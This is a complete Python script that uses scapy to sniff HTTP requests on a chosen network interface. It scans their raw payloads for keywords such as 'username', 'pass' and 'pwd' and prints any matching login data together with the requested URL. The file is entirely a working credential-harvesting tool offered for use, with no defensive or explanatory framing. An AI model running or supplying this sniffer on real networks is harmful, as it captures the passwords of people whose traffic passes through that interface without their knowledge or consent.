#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http
import optparse


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        keywords = ["username", "user", " password", "pass", "pwd", "uname"]
        for keywords in keywords:
            if keywords in load:
                return load

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        login_info = get_login_info(packet)
        if login_info:
            print("[+] HTTP Request >> " + url)
            print("[+] Possible username/password > " + login_info + "\n\n")

def get_arguments():
    parser = optparse.OptionParser()

    parser.add_option("-i", "--interface", dest="interface", help="Interface to sniff")
    (options, arguments) = parser.parse_args()

    if not options.interface:
        parser.error("[-] Please specify an interface, use --help for more info.")
    return options





options = get_arguments()
sniff(options.interface)
